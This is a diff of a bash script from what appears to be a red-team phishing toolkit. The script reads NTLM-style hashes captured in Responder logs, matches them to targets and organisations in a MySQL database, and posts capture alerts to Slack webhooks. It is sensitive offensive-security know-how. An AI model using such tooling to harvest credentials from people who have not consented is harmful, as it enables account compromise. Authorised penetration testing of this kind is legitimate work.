@@ -1,9 +1,4 @@
 #!/bin/bash
-
-SlackURL="https://hooks.slack.com/services/YOUR_SLACK_WEBHOOK_URL_HERE"
-SlackChannel="#YOUR_SLACK_CHANNEL_HERE"
-APIResultsURL="https://YOUR_API_DOMAIN_HERE/phishingdocs/results"
-
 files=$(cd /home/ubuntu/Responder/logs && ls *.txt | awk '{print $1}');
 
 IFS='
@@ -20,19 +15,23 @@ do
   Hashes=$(cat /home/ubuntu/Responder/logs/$file);
 
   Query=$(mysql -u root phishingdocs -se "CALL MatchHashes('$IP','$Hashes');");
-
+        echo $Query
   Target=$(echo $Query | cut -f 1);
   Org=$(echo $Query | cut -f 2);
+  Token=$(echo $Query | cut -f 3);
+  Channel=$(echo $Query | cut -f 4);
+  UUID=$(echo $Query | cut -f 5);
+
+  APIResultsURL="https://YOUR_API_DOMAIN_HERE.com/phishingdocs/results?UUID="$UUID
 
   message=$(echo "> *HIT!!* Captured a" $HashType "hash ("$Module") for" $Target "at" $Org "(<"$APIResultsURL"|"$IP">)");
 
-  if [ -z "$Target" ] || [ -z "$Org" ]
+  if [ -z "$Target" ] || [ -z "$Org" ];
   then
       message=$(echo "> Captured an out of scope" $HashType "hash ("$Module") at" $IP);
-  fi
-
-  curl -s -X POST --data-urlencode 'payload={"channel": "'$SlackChannel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $SlackURL
-
+  else
+  curl -s -X POST --data-urlencode 'payload={"channel": "'$Channel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $Token
   rm /home/ubuntu/Responder/logs/$file;
+  fi
 
 done
